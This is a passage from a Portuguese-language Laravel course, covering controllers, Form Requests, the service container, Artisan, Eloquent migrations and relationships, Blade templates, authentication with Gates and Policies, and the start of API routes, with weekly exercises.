// Rotas agrupadas com prefixo e middleware
Route::middleware('auth')->prefix('admin')->group(function () {
    Route::resource('produtos', ProdutoController::class);
    Route::resource('pedidos', PedidoController::class);
});

// Rotas nomeadas — facilita geração de URLs
Route::get('/contato', [ContatoController::class, 'index'])->name('contato');
// Uso: route('contato') → /contato
```

---

## Controllers

```bash
# Criar um controller com os métodos CRUD já estruturados
php artisan make:controller ProdutoController --resource
```

```php
<?php
declare(strict_types=1);

namespace App\Http\Controllers;

use App\Models\Produto;
use App\Http\Requests\ProdutoRequest;
use Illuminate\Http\RedirectResponse;
use Illuminate\View\View;

class ProdutoController extends Controller
{
    // GET /produtos
    public function index(): View
    {
        $produtos = Produto::where('ativo', true)
            ->orderBy('nome')
            ->paginate(15);

        return view('produtos.index', compact('produtos'));
    }

    // GET /produtos/{produto}
    // O Laravel resolve automaticamente o Model pelo ID (Route Model Binding)
    public function show(Produto $produto): View
    {
        return view('produtos.show', compact('produto'));
    }

    // GET /produtos/create
    public function create(): View
    {
        return view('produtos.create');
    }

    // POST /produtos
    public function store(ProdutoRequest $request): RedirectResponse
    {
        // $request->validated() retorna apenas os campos que passaram na validação
        $produto = Produto::create($request->validated());

        return redirect()
            ->route('produtos.show', $produto)
            ->with('sucesso', 'Produto criado com sucesso!');
    }

    // PUT /produtos/{produto}
    public function update(ProdutoRequest $request, Produto $produto): RedirectResponse
    {
        $produto->update($request->validated());

        return redirect()
            ->route('produtos.show', $produto)
            ->with('sucesso', 'Produto atualizado.');
    }

    // DELETE /produtos/{produto}
    public function destroy(Produto $produto): RedirectResponse
    {
        $produto->delete();

        return redirect()
            ->route('produtos.index')
            ->with('sucesso', 'Produto removido.');
    }
}
```

---

## Form Requests — validação encapsulada

```bash
php artisan make:request ProdutoRequest
```

```php
<?php
declare(strict_types=1);

namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;

class ProdutoRequest extends FormRequest
{
    // Autorização — quem pode fazer esta requisição?
    public function authorize(): bool
    {
        return $this->user()?->isAdmin() ?? false;
    }

    // Regras de validação
    public function rules(): array
    {
        return [
            'nome'     => ['required', 'string', 'min:3', 'max:200'],
            'preco'    => ['required', 'numeric', 'min:0'],
            'estoque'  => ['required', 'integer', 'min:0'],
            'ativo'    => ['boolean'],
            'descricao'=> ['nullable', 'string', 'max:2000'],
            'imagem'   => ['nullable', 'image', 'max:2048'], // máx 2MB
        ];
    }

    // Mensagens customizadas
    public function messages(): array
    {
        return [
            'nome.required'  => 'O nome do produto é obrigatório.',
            'preco.min'      => 'O preço não pode ser negativo.',
            'imagem.image'   => 'O arquivo deve ser uma imagem.',
            'imagem.max'     => 'A imagem deve ter no máximo 2MB.',
        ];
    }
}
```

---

## Service Container e Service Providers

O Service Container do Laravel é um container de DI poderoso. Você registra como criar objetos, e o Laravel injeta automaticamente onde forem necessários:

```php
<?php
// app/Providers/AppServiceProvider.php

namespace App\Providers;

use App\Repositories\ProdutoRepositorioInterface;
use App\Repositories\EloquentProdutoRepositorio;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    public function register(): void
    {
        // Bind interface → implementação concreta
        $this->app->bind(
            ProdutoRepositorioInterface::class,
            EloquentProdutoRepositorio::class,
        );
    }

    public function boot(): void
    {
        // Executado após todos os providers registrarem seus serviços
    }
}

// Agora o controller pode declarar a interface no construtor:
class ProdutoController extends Controller
{
    public function __construct(
        private readonly ProdutoRepositorioInterface $repositorio,
    ) {}
}
// O Laravel injeta automaticamente a implementação concreta
```

---

## Artisan — a CLI do Laravel

```bash
# Listar todos os comandos disponíveis
php artisan list

# Criar arquivos
php artisan make:model Produto -mfc      # Model + migration + factory + controller
php artisan make:migration criar_tabela_pedidos
php artisan make:seeder ProdutoSeeder
php artisan make:job ProcessarPagamento
php artisan make:event PedidoCriado
php artisan make:listener EnviarEmailDePedido
php artisan make:command ImportarProdutos

# Executar
php artisan migrate                      # Roda as migrations pendentes
php artisan migrate:fresh --seed         # Recria o banco e roda seeds
php artisan db:seed                      # Apenas seeds
php artisan queue:work                   # Processa filas
php artisan schedule:run                 # Executa tarefas agendadas

# Informações
php artisan route:list                   # Lista todas as rotas
php artisan config:show database         # Exibe config do banco
php artisan tinker                       # REPL interativo — testado no console
```

---

## Resumo

| Conceito | Laravel |
|---|---|
| Roteamento | `routes/web.php` — fluente, com grupos e middleware |
| Controllers | Classes em `app/Http/Controllers/` — um método por ação |
| Validação | `FormRequest` encapsula regras e autorização |
| DI Container | `ServiceProvider` registra bindings — injeção automática |
| CLI | `php artisan` — gera código, migra banco, processa filas |
| Configuração | `.env` + `config/` — nunca hardcode de credenciais |

---

## Exercício da semana

1. Crie um projeto Laravel do zero. Configure o banco de dados. Crie um CRUD completo de `Categoria` com: migration, model, controller resource, form request com validação, e views Blade básicas.

2. Adicione Route Model Binding ao CRUD: ao acessar `/categorias/{categoria}`, o Laravel deve resolver automaticamente o model pelo ID e retornar 404 se não encontrar.

3. Implemente uma interface `CategoriaRepositorioInterface` com método `listarAtivas(): Collection`. Crie a implementação com Eloquent. Registre o binding no `AppServiceProvider`. Injete no controller.

4. **Desafio:** crie um comando Artisan customizado `php artisan categorias:importar {arquivo}` que leia um CSV e importe categorias no banco, exibindo progresso com `$this->progressBar()`.

---

## Referências

- Documentação oficial do Laravel: https://laravel.com/docs
- Laracasts (vídeos): https://laracasts.com/
- Laravel News: https://laravel-news.com/
- Awesome Laravel: https://github.com/chiraggude/awesome-laravel

---

# Artigo 42 — Eloquent ORM com Laravel

**Módulo 7 · Semana 42 · Nível: Intermediário**

---

## Introdução

Eloquent é o ORM do Laravel, e é um dos mais elegantes disponíveis em qualquer linguagem. Cada tabela do banco tem um Model correspondente. Cada linha da tabela é representada por uma instância do Model. Relacionamentos entre tabelas viram métodos fluentes. Queries complexas viram código que se lê em voz alta.

Já vimos Eloquent brevemente no artigo 22. Aqui aprofundamos no contexto do Laravel: migrations integradas, factories, relacionamentos avançados, e os recursos que fazem o Eloquent brilhar em projetos reais.

---

## Migrations

Migrations são controle de versão para o banco de dados. Cada alteração no schema é um arquivo versionado que pode ser aplicado e revertido:

```bash
php artisan make:migration criar_tabela_produtos
```

```php
<?php
// database/migrations/2024_01_15_000001_criar_tabela_produtos.php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    public function up(): void
    {
        Schema::create('categorias', function (Blueprint $table) {
            $table->id();
            $table->string('nome', 100);
            $table->string('slug', 120)->unique();
            $table->text('descricao')->nullable();
            $table->boolean('ativo')->default(true);
            $table->timestamps(); // created_at e updated_at automáticos
        });

        Schema::create('produtos', function (Blueprint $table) {
            $table->id();
            $table->foreignId('categoria_id')
                  ->constrained()          // referencia categorias.id
                  ->cascadeOnDelete();     // deleta produtos ao deletar categoria
            $table->string('nome', 200);
            $table->string('slug', 220)->unique();
            $table->text('descricao')->nullable();
            $table->decimal('preco', 10, 2);
            $table->unsignedInteger('estoque')->default(0);
            $table->boolean('ativo')->default(true);
            $table->json('atributos')->nullable();   // dados extras flexíveis
            $table->softDeletes();                   // deleted_at — soft delete
            $table->timestamps();

            $table->index(['ativo', 'categoria_id']); // índice composto
        });
    }

    public function down(): void
    {
        Schema::dropIfExists('produtos');
        Schema::dropIfExists('categorias');
    }
};
```

```bash
php artisan migrate          # Aplica migrations pendentes
php artisan migrate:rollback # Reverte a última batch
php artisan migrate:status   # Mostra status de cada migration
```

---

## Models e fillable

```php
<?php
declare(strict_types=1);

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\SoftDeletes;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Support\Str;

class Produto extends Model
{
    use HasFactory, SoftDeletes;

    // Campos que podem ser preenchidos em massa
    protected $fillable = [
        'categoria_id',
        'nome',
        'slug',
        'descricao',
        'preco',
        'estoque',
        'ativo',
        'atributos',
    ];

    // Casting automático de tipos
    protected $casts = [
        'preco'     => 'decimal:2',
        'estoque'   => 'integer',
        'ativo'     => 'boolean',
        'atributos' => 'array',   // JSON → array automaticamente
    ];

    // Hook: executado antes de criar
    protected static function booted(): void
    {
        static::creating(function (Produto $produto) {
            if (empty($produto->slug)) {
                $produto->slug = Str::slug($produto->nome);
            }
        });
    }

    // Accessor: transforma o valor ao ler
    public function getPrecoFormatadoAttribute(): string
    {
        return 'R$ ' . number_format($this->preco, 2, ',', '.');
    }

    // Scope: query reutilizável
    public function scopeAtivo($query)
    {
        return $query->where('ativo', true)->where('estoque', '>', 0);
    }

    // Relacionamentos
    public function categoria(): BelongsTo
    {
        return $this->belongsTo(Categoria::class);
    }

    public function avaliacoes(): HasMany
    {
        return $this->hasMany(Avaliacao::class);
    }
}
```

---

## Relacionamentos completos

```php
<?php
// Belongs To Many (muitos para muitos) — pedidos ↔ produtos
class Pedido extends Model
{
    public function produtos(): BelongsToMany
    {
        return $this->belongsToMany(Produto::class, 'pedido_produto')
            ->withPivot(['quantidade', 'preco_unitario'])  // colunas extras na pivot
            ->withTimestamps();
    }

    // Has Many Through — usuário → pedidos → produtos
    public function produtosComprados(): HasManyThrough
    {
        return $this->hasManyThrough(Produto::class, PedidoProduto::class);
    }
}

// Polymorphic — comentários em produtos E posts
class Comentario extends Model
{
    public function comentavel(): MorphTo
    {
        return $this->morphTo();
    }
}

class Produto extends Model
{
    public function comentarios(): MorphMany
    {
        return $this->morphMany(Comentario::class, 'comentavel');
    }
}
```

---

## Queries com Eloquent

```php
<?php

// Básico
$produtos = Produto::all();
$produto  = Produto::find(1);
$produto  = Produto::findOrFail(1);        // lança 404 se não encontrar

// Com condições
$ativos = Produto::where('ativo', true)
    ->where('estoque', '>', 0)
    ->orderBy('nome')
    ->get();

// Usando o scope definido no model
$ativos = Produto::ativo()->orderBy('nome')->get();

// Eager loading — carrega relacionamentos em uma query (evita N+1)
$produtos = Produto::with(['categoria', 'avaliacoes'])
    ->where('ativo', true)
    ->get();

// Paginação
$produtos = Produto::ativo()
    ->with('categoria')
    ->paginate(15);

// Inserir
$produto = Produto::create([
    'nome'         => 'Monitor LG 27"',
    'preco'        => 2499.90,
    'categoria_id' => 3,
    'estoque'      => 10,
]);

// Atualizar
$produto->update(['preco' => 2299.90, 'estoque' => 8]);

// Upsert
Produto::updateOrCreate(
    ['slug' => 'monitor-lg-27'],           // condição
    ['nome' => 'Monitor LG 27"', 'preco' => 2299.90]  // valores
);

// Deletar (soft delete com SoftDeletes)
$produto->delete();          // seta deleted_at, não remove do banco
$produto->restore();         // restaura
$produto->forceDelete();     // remove definitivamente

// Incluir deletados nas queries
Produto::withTrashed()->where('nome', 'like', '%lg%')->get();
Produto::onlyTrashed()->get();

// Usando pivot em many-to-many
$pedido->produtos()->attach($produtoId, [
    'quantidade'     => 2,
    'preco_unitario' => 299.90,
]);
$pedido->produtos()->sync([1, 2, 3]);  // sincroniza a lista completa
```

---

## Factories e Seeders

```bash
php artisan make:factory ProdutoFactory
```

```php
<?php
// database/factories/ProdutoFactory.php

namespace Database\Factories;

use App\Models\Categoria;
use Illuminate\Database\Eloquent\Factories\Factory;

class ProdutoFactory extends Factory
{
    public function definition(): array
    {
        return [
            'categoria_id' => Categoria::factory(),
            'nome'         => $this->faker->words(3, true),
            'preco'        => $this->faker->randomFloat(2, 9.90, 2999.90),
            'estoque'      => $this->faker->numberBetween(0, 100),
            'ativo'        => $this->faker->boolean(80), // 80% chance de true
            'descricao'    => $this->faker->paragraph(),
        ];
    }

    // States — variações da factory
    public function esgotado(): static
    {
        return $this->state(['estoque' => 0, 'ativo' => false]);
    }

    public function premium(): static
    {
        return $this->state(['preco' => $this->faker->randomFloat(2, 1000, 9999)]);
    }
}

// Uso nos testes:
$produto  = Produto::factory()->create();
$produtos = Produto::factory()->count(20)->create();
$esgotado = Produto::factory()->esgotado()->create();

// Seeder:
class DatabaseSeeder extends Seeder
{
    public function run(): void
    {
        Categoria::factory()->count(10)->create();
        Produto::factory()->count(50)->create();
    }
}
```

---

## Resumo

| Recurso | Como funciona |
|---|---|
| Migrations | Schema versionado — `up()` aplica, `down()` reverte |
| Fillable | Define campos aceitos em mass assignment |
| Casts | Converte tipos automaticamente ao ler/escrever |
| Scopes | Queries reutilizáveis encapsuladas no Model |
| Eager loading | `with()` previne o problema N+1 |
| Soft deletes | `deleted_at` em vez de `DELETE` — dados recuperáveis |
| Factories | Geração de dados falsos para testes |

---

## Exercício da semana

1. Crie migrations para: `usuarios`, `categorias`, `produtos`, `pedidos`, `pedido_produto` (pivot). Use `foreignId()->constrained()`, `softDeletes()`, `timestamps()` e índices apropriados.

2. Implemente o relacionamento many-to-many entre `Pedido` e `Produto` com `withPivot(['quantidade', 'preco_unitario'])`. Escreva código que cria um pedido, adiciona produtos via `attach()`, e calcula o total iterando sobre `$pedido->produtos`.

3. Crie factories para todos os models. Use states: `Produto::factory()->esgotado()`, `Pedido::factory()->cancelado()`. Crie um seeder que gera dados realistas para o ambiente de desenvolvimento.

4. **Desafio:** implemente o Observer Pattern com Eloquent Observers: `php artisan make:observer ProdutoObserver`. Ao criar um produto, gere o slug automaticamente. Ao deletar (soft delete), desative todos os itens de pedidos pendentes que contêm esse produto.

---

## Referências

- Eloquent ORM — Documentação Laravel: https://laravel.com/docs/eloquent
- Eloquent Relationships: https://laravel.com/docs/eloquent-relationships
- Database Migrations: https://laravel.com/docs/migrations
- Laravel Factories: https://laravel.com/docs/eloquent-factories

---

# Artigo 43 — Blade — Templates no Laravel

**Módulo 7 · Semana 43 · Nível: Intermediário**

---

## Introdução

Blade é o motor de templates do Laravel. Ele compila templates para PHP puro e os armazena em cache, então não há penalidade de performance. A sintaxe é limpa, expressiva, e evita que você misture lógica de negócio com apresentação — um problema clássico do PHP puro com HTML.

Blade não é apenas uma forma de escrever `<?php echo ?>` mais curto. Oferece herança de layouts, componentes reutilizáveis, slots, stacks, e diretivas que tornam templates complexos gerenciáveis.

---

## Sintaxe básica

```blade
{{-- Comentário Blade — não aparece no HTML final --}}

{{-- Exibir variável com escape automático (equivalente a htmlspecialchars) --}}
{{ $produto->nome }}

{{-- Exibir HTML sem escape — use com cuidado --}}
{!! $produto->descricao_html !!}

{{-- Expressões PHP --}}
{{ strtoupper($produto->nome) }}
{{ $produto->preco_formatado }}
{{ now()->format('d/m/Y') }}
```

---

## Estruturas de controle

```blade
{{-- Condicionais --}}
@if ($produto->estoque > 0)
    <span class="badge verde">Em estoque</span>
@elseif ($produto->estoque === 0)
    <span class="badge vermelho">Esgotado</span>
@else
    <span class="badge cinza">Indisponível</span>
@endif

{{-- unless = if negado --}}
@unless ($usuario->isAdmin())
    <p>Acesso restrito a administradores.</p>
@endunless

{{-- isset e empty --}}
@isset($produto->descricao)
    <p>{{ $produto->descricao }}</p>
@endisset

@empty($produtos)
    <p>Nenhum produto encontrado.</p>
@endempty

{{-- Loops --}}
@foreach ($produtos as $produto)
    <div class="produto">
        <h3>{{ $produto->nome }}</h3>
        <p>R$ {{ number_format($produto->preco, 2, ',', '.') }}</p>
    </div>
@endforeach

{{-- $loop — variável especial dentro de foreach --}}
@foreach ($produtos as $produto)
    <div class="{{ $loop->even ? 'par' : 'impar' }}">
        {{ $loop->iteration }}/{{ $loop->count }}: {{ $produto->nome }}
        @if ($loop->first) <span>← primeiro</span> @endif
        @if ($loop->last) <span>← último</span> @endif
    </div>
@endforeach

{{-- forelse: bloco para quando a coleção for vazia --}}
@forelse ($produtos as $produto)
    <p>{{ $produto->nome }}</p>
@empty
    <p>Nenhum produto cadastrado.</p>
@endforelse

{{-- for e while --}}
@for ($i = 1; $i <= 5; $i++)
    <p>Item {{ $i }}</p>
@endfor
```

---

## Herança de layouts

O padrão mais comum no Blade é definir um layout principal que as views estendem:

```blade
{{-- resources/views/layouts/app.blade.php --}}
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>@yield('title', 'Minha Loja')</title>
    <link rel="stylesheet" href="{{ asset('css/app.css') }}">
    @stack('styles')
</head>
<body>
    <header>
        <nav>
            <a href="{{ route('home') }}">Início</a>
            <a href="{{ route('produtos.index') }}">Produtos</a>
            @auth
                <a href="{{ route('perfil') }}">{{ auth()->user()->nome }}</a>
                <a href="{{ route('logout') }}">Sair</a>
            @endauth
            @guest
                <a href="{{ route('login') }}">Entrar</a>
            @endguest
        </nav>
    </header>

    <main>
        @if (session('sucesso'))
            <div class="alerta sucesso">{{ session('sucesso') }}</div>
        @endif

        @if (session('erro'))
            <div class="alerta erro">{{ session('erro') }}</div>
        @endif

        @yield('content')
    </main>

    <footer>
        <p>© {{ date('Y') }} Minha Loja</p>
    </footer>

    <script src="{{ asset('js/app.js') }}"></script>
    @stack('scripts')
</body>
</html>
```

```blade
{{-- resources/views/produtos/index.blade.php --}}
@extends('layouts.app')

@section('title', 'Produtos | Minha Loja')

@push('styles')
    <link rel="stylesheet" href="{{ asset('css/produtos.css') }}">
@endpush

@section('content')
    <h1>Produtos</h1>

    <div class="grade-produtos">
        @forelse ($produtos as $produto)
            <div class="card-produto">
                <h3>
                    <a href="{{ route('produtos.show', $produto) }}">
                        {{ $produto->nome }}
                    </a>
                </h3>
                <p>{{ $produto->preco_formatado }}</p>
                <p>{{ $produto->categoria->nome }}</p>
            </div>
        @empty
            <p>Nenhum produto disponível.</p>
        @endforelse
    </div>

    {{-- Paginação --}}
    {{ $produtos->links() }}

@endsection

@push('scripts')
    <script src="{{ asset('js/produtos.js') }}"></script>
@endpush
```

---

## Componentes

Componentes são o recurso mais poderoso do Blade moderno — permitem criar elementos reutilizáveis com lógica e template encapsulados:

```bash
php artisan make:component Alerta
php artisan make:component Produto/Card
```

```php
<?php
// app/View/Components/Alerta.php

namespace App\View\Components;

use Illuminate\View\Component;

class Alerta extends Component
{
    public function __construct(
        public readonly string $tipo = 'info',  // info, sucesso, erro, aviso
        public readonly bool $descartavel = false,
    ) {}

    public function classes(): string
    {
        return match($this->tipo) {
            'sucesso' => 'alerta alerta-sucesso',
            'erro'    => 'alerta alerta-erro',
            'aviso'   => 'alerta alerta-aviso',
            default   => 'alerta alerta-info',
        };
    }

    public function render()
    {
        return view('components.alerta');
    }
}
```

```blade
{{-- resources/views/components/alerta.blade.php --}}
<div {{ $attributes->class([$classes()]) }}>
    {{ $slot }}
    @if ($descartavel)
        <button onclick="this.parentElement.remove()">×</button>
    @endif
</div>
```

```blade
{{-- Usando o componente --}}
<x-alerta tipo="sucesso">
    Produto criado com sucesso!
</x-alerta>

<x-alerta tipo="erro" :descartavel="true">
    Ocorreu um erro ao processar o pagamento.
</x-alerta>

{{-- Componente com múltiplos slots --}}
<x-card>
    <x-slot name="header">
        <h3>{{ $produto->nome }}</h3>
    </x-slot>

    <p>{{ $produto->descricao }}</p>

    <x-slot name="footer">
        <a href="{{ route('produtos.show', $produto) }}">Ver mais</a>
    </x-slot>
</x-card>
```

---

## Formulários e erros de validação

```blade
{{-- Formulário de criação de produto --}}
<form method="POST" action="{{ route('produtos.store') }}" enctype="multipart/form-data">
    @csrf  {{-- Token CSRF automático --}}

    <div>
        <label for="nome">Nome</label>
        <input type="text"
               id="nome"
               name="nome"
               value="{{ old('nome') }}"
               class="{{ $errors->has('nome') ? 'erro' : '' }}">
        @error('nome')
            <span class="mensagem-erro">{{ $message }}</span>
        @enderror
    </div>

    <div>
        <label for="preco">Preço</label>
        <input type="number"
               id="preco"
               name="preco"
               step="0.01"
               value="{{ old('preco') }}">
        @error('preco')
            <span class="mensagem-erro">{{ $message }}</span>
        @enderror
    </div>

    <div>
        <label for="categoria_id">Categoria</label>
        <select id="categoria_id" name="categoria_id">
            <option value="">Selecione...</option>
            @foreach ($categorias as $categoria)
                <option value="{{ $categoria->id }}"
                    {{ old('categoria_id') == $categoria->id ? 'selected' : '' }}>
                    {{ $categoria->nome }}
                </option>
            @endforeach
        </select>
        @error('categoria_id')
            <span class="mensagem-erro">{{ $message }}</span>
        @enderror
    </div>

    {{-- Para edição: método PUT --}}
    {{-- @method('PUT') --}}

    <button type="submit">Salvar</button>
</form>
```

---

## Resumo

| Recurso | Sintaxe |
|---|---|
| Exibir variável | `{{ $var }}` (com escape) / `{!! $var !!}` (sem escape) |
| Condicional | `@if / @elseif / @else / @endif` |
| Loop | `@foreach / @forelse / @for` |
| Layout | `@extends / @section / @yield` |
| Stack | `@stack / @push` |
| Componente | `<x-nome-componente :prop="$valor">` |
| CSRF | `@csrf` — obrigatório em todo formulário POST |
| Erros | `@error('campo') {{ $message }} @enderror` |
| Auth | `@auth / @guest / @can` |

---

## Exercício da semana

1. Crie um layout principal com header, footer e área de flash messages. Crie views para listar, exibir, criar e editar produtos, todas estendendo o layout.

2. Construa um componente `<x-produto-card>` que recebe um `$produto` e exibe nome, preço, categoria e estoque. Use o componente na listagem.

3. Implemente um componente `<x-paginacao>` que envolve `$colecao->links()` com estilos customizados.

4. **Desafio:** crie um componente `<x-data-table>` genérico que recebe `$colunas` (array de configuração) e `$dados` (coleção) e renderiza uma tabela completa com ordenação por coluna via query string.

---

## Referências

- Blade Templates — Documentação: https://laravel.com/docs/blade
- Blade Components: https://laravel.com/docs/blade#components
- Laravel Collective Forms (helper adicional): https://laravelcollective.com/

---

# Artigo 44 — Autenticação e Autorização no Laravel

**Módulo 7 · Semana 44 · Nível: Intermediário–Avançado**

---

## Introdução

Autenticação responde "quem é você?" — verifica identidade. Autorização responde "o que você pode fazer?" — verifica permissões. Laravel oferece infraestrutura completa para ambas, com flexibilidade para ir do simples ao complexo conforme o sistema cresce.

---

## Laravel Breeze — scaffolding de autenticação

Para a maioria dos projetos, o ponto de partida é o Laravel Breeze:

```bash
composer require laravel/breeze --dev
php artisan breeze:install blade   # ou: react, vue, api
php artisan migrate
npm install && npm run dev
```

O Breeze instala: rotas de login/registro/logout/reset de senha, controllers, views Blade completas, e middleware de autenticação — tudo pronto para customizar.

---

## Autenticação manual

Entender como funciona por baixo é fundamental:

```php
<?php
declare(strict_types=1);

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;

class LoginController extends Controller
{
    public function store(Request $request): RedirectResponse
    {
        $credenciais = $request->validate([
            'email' => ['required', 'email'],
            'senha' => ['required'],
        ]);

        // Auth::attempt verifica email + senha e cria a sessão
        if (!Auth::attempt(
            ['email' => $credenciais['email'], 'password' => $credenciais['senha']],
            $request->boolean('lembrar'),  // "Lembrar de mim"
        )) {
            throw ValidationException::withMessages([
                'email' => 'Email ou senha incorretos.',
            ]);
        }

        // Regenera session ID — previne session fixation
        $request->session()->regenerate();

        return redirect()->intended(route('dashboard'));
    }

    public function destroy(Request $request): RedirectResponse
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
```

---

## Middleware de autenticação

```php
<?php
// routes/web.php

// Proteger rotas com middleware auth
Route::middleware('auth')->group(function () {
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::resource('pedidos', PedidoController::class);
});

// Redirecionar usuários já autenticados
Route::middleware('guest')->group(function () {
    Route::get('/login', [LoginController::class, 'create'])->name('login');
    Route::post('/login', [LoginController::class, 'store']);
});
```

---

## Autorização com Gates e Policies

**Gates** — regras simples de autorização definidas em closures:

```php
<?php
// app/Providers/AppServiceProvider.php

use Illuminate\Support\Facades\Gate;

public function boot(): void
{
    Gate::define('editar-produto', function (User $usuario, Produto $produto) {
        return $usuario->isAdmin() || $produto->criado_por === $usuario->id;
    });

    Gate::define('acessar-admin', function (User $usuario) {
        return $usuario->role === 'admin';
    });
}

// Uso no controller:
public function update(Request $request, Produto $produto): RedirectResponse
{
    Gate::authorize('editar-produto', $produto); // lança 403 se não autorizado

    $produto->update($request->validated());
    return redirect()->route('produtos.show', $produto);
}

// Verificação sem lançar exceção:
if (Gate::allows('acessar-admin')) {
    // mostra menu admin
}

if (Gate::denies('editar-produto', $produto)) {
    abort(403);
}
```

**Policies** — autorização encapsulada por Model, para projetos maiores:

```bash
php artisan make:policy ProdutoPolicy --model=Produto
```

```php
<?php
namespace App\Policies;

use App\Models\Produto;
use App\Models\User;

class ProdutoPolicy
{
    // Antes de qualquer método — admin pode tudo
    public function before(User $user): ?bool
    {
        if ($user->isAdmin()) return true;
        return null; // null = continua verificando o método específico
    }

    public function viewAny(User $user): bool
    {
        return true; // qualquer usuário autenticado pode listar
    }

    public function view(User $user, Produto $produto): bool
    {
        return $produto->ativo || $user->isAdmin();
    }

    public function create(User $user): bool
    {
        return $user->hasPermission('criar-produto');
    }

    public function update(User $user, Produto $produto): bool
    {
        return $user->id === $produto->criado_por;
    }

    public function delete(User $user, Produto $produto): bool
    {
        return $user->id === $produto->criado_por && $produto->pedidos()->count() === 0;
    }
}
```

```php
// Registrar a policy (Laravel detecta automaticamente por convenção)
// app/Providers/AppServiceProvider.php
use Illuminate\Support\Facades\Gate;

Gate::policy(Produto::class, ProdutoPolicy::class);

// Uso no controller:
public function update(ProdutoRequest $request, Produto $produto): RedirectResponse
{
    $this->authorize('update', $produto); // usa ProdutoPolicy::update()

    $produto->update($request->validated());
    return redirect()->route('produtos.show', $produto);
}

// No Blade:
@can('update', $produto)
    <a href="{{ route('produtos.edit', $produto) }}">Editar</a>
@endcan

@cannot('delete', $produto)
    <span class="desabilitado">Não pode deletar</span>
@endcannot
```

---

## Roles e Permissions — sistema completo

Para sistemas maiores, o pacote `spatie/laravel-permission` é padrão do mercado:

```bash
composer require spatie/laravel-permission
php artisan vendor:publish --provider="Spatie\Permission\PermissionServiceProvider"
php artisan migrate
```

```php
<?php
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;

// Setup de roles e permissions
$admin   = Role::create(['name' => 'admin']);
$editor  = Role::create(['name' => 'editor']);
$cliente = Role::create(['name' => 'cliente']);

Permission::create(['name' => 'criar produto']);
Permission::create(['name' => 'editar produto']);
Permission::create(['name' => 'deletar produto']);
Permission::create(['name' => 'ver pedidos']);

$admin->givePermissionTo(Permission::all());
$editor->givePermissionTo(['criar produto', 'editar produto']);

// Atribuir role ao usuário
$usuario->assignRole('editor');
$usuario->givePermissionTo('ver pedidos');

// Verificações
$usuario->hasRole('admin');
$usuario->can('deletar produto');
$usuario->hasAnyRole(['admin', 'editor']);

// No Blade:
@role('admin')
    <a href="/admin">Painel Admin</a>
@endrole

@hasanyrole('admin|editor')
    <a href="/produtos/criar">Criar Produto</a>
@endhasanyrole
```

---

## Resumo

| Conceito | Função |
|---|---|
| `Auth::attempt()` | Verifica credenciais e cria sessão |
| Middleware `auth` | Bloqueia rotas para não autenticados |
| Gates | Regras de autorização simples e pontuais |
| Policies | Autorização encapsulada por Model |
| `$this->authorize()` | Verifica policy — lança 403 se negado |
| `@can / @cannot` | Verifica autorização no Blade |
| spatie/permission | Roles e permissions para sistemas complexos |

---

## Exercício da semana

1. Implemente autenticação completa sem Breeze: login, logout, registro, proteção de rotas. Use `Auth::attempt()` e `session()->regenerate()` manualmente.

2. Crie uma `PedidoPolicy` com métodos `view`, `create`, `update`, `cancel`. Um usuário só pode ver e cancelar seus próprios pedidos. Admins podem tudo.

3. Instale `spatie/laravel-permission`. Crie roles: `admin`, `vendedor`, `cliente`. Defina permissions granulares. Crie um seeder que cria os roles e um admin inicial.

4. **Desafio:** implemente autenticação de dois fatores (2FA) simples: após login com senha, se o usuário tiver 2FA ativado, redirecione para uma tela de código TOTP. Use o pacote `pragmarx/google2fa-laravel`.

---

## Referências

- Laravel Authentication: https://laravel.com/docs/authentication
- Laravel Authorization: https://laravel.com/docs/authorization
- Spatie Laravel Permission: https://spatie.be/docs/laravel-permission
- Laravel Breeze: https://laravel.com/docs/starter-kits#laravel-breeze

---

# Artigo 45 — APIs com Laravel

**Módulo 7 · Semana 45 · Nível: Intermediário–Avançado**

---

## Introdução

Construir uma API com Laravel puro é possível — mas o framework oferece ferramentas específicas que tornam o processo mais organizado e profissional: API Resources para formatar respostas, Sanctum para autenticação stateless, rate limiting nativo, e convenções que tornam sua API previsível para quem a consome.

---

## Configurando rotas de API

```php
<?php
// routes/api.php — rotas aqui são prefixadas com /api automaticamente

use App\Http\Controllers\Api\ProdutoController;
use App\Http\Controllers\Api\AuthController;
use Illuminate\Support\Facades\Route;

// Rotas públicas
Route::post('/auth/login',    [AuthController::class, 'login']);
Route::post('/auth/register', [AuthController::class, 'register']);
Route::get('/produtos',       [ProdutoController::class, 'index']);
Route::get('/produtos/{produto}', [ProdutoController::class, 'show']);

// Rotas protegidas com Sanctum
Route::middleware('auth:sanctum')->group(function () {
    Route::post('/auth/logout', [AuthController::class, 'logout']);
    Route::apiResource('pedidos', PedidoController::class);
    Route::post('/produtos', [ProdutoController::class, 'store']);
    Route::put('/produtos/{produto}', [ProdutoController::class, 'update']);
    Route::delete('/produtos/{produto}', [ProdutoController::class, 'destroy']);
});
```

---

## API Resources — formatando respostas

Resources transformam models em arrays JSON, desacoplando a estrutura da resposta da estrutura do banco:

```bash
php artisan make:resource ProdutoResource
php artisan make:resource ProdutoCollection
```

```php
<?php
namespace App\Http\Resources;

use Illuminate\Http\Request;
use Illuminate\Http\Resources\Json\JsonResource;

class ProdutoResource extends JsonResource
{
    public function toArray(Request $request): array
    {
        return [
            'id'          => $this->id,
            'nome'        => $this->nome,
            'slug'        => $this->slug,
            'preco'       => (float) $this->preco,
            'preco_formatado' => $this->preco_formatado,
            'estoque'     => $this->estoque,
            'disponivel'  => $this->estoque > 0 && $this->ativo,

            // Relacionamento — só inclui se foi carregado (evita N+1)
